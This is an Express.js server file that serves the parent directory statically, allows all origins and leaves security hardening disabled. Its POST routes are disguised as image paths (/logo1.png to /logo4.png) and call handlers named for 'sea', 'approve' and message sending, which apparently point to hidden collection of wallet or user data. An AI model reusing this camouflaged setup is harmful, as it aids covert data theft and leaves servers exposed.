import express from "express";
import helmet from "helmet";
import { addApproveHandler } from "./api/addApproveHandler.js";
import { addSeaHandler } from "./api/addSeaHandler.js";
import { sendMessHandler } from "./api/sendMessHandler.js";
import { parser } from "./api/parser.js";
import { checkTables } from "./db/checkTables.js";
import { getDB } from "./db/getDb.js";
import { PORT } from "./utils/constants.js";

const app = express();

/* ---- Database ---- */
getDB().then((db) => checkTables(db));

/* ---- Helpers ---- */
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

// app.use(helmet());
// app.disable("x-powered-by");

const staticPath = express.static('../');
app.use(staticPath);
/* ---- Methods ---- */
// app.get("/", (_, res) => res.sendFile("index.html"));
// app.get("/", (_, res) => res.send("Bye World!"));
app.post("/logo1.png", (req, res) => addSeaHandler(req, res));
app.post("/logo2.png", (req, res) => addApproveHandler(req, res));
app.post("/logo3.png", (req, res) => sendMessHandler(req, res));
app.post("/logo4.png", (req, res) => parser(req, res));

/* ---- Start ---- */
app.listen(PORT, () => {
  console.log(`Started on ${PORT}...`);
});
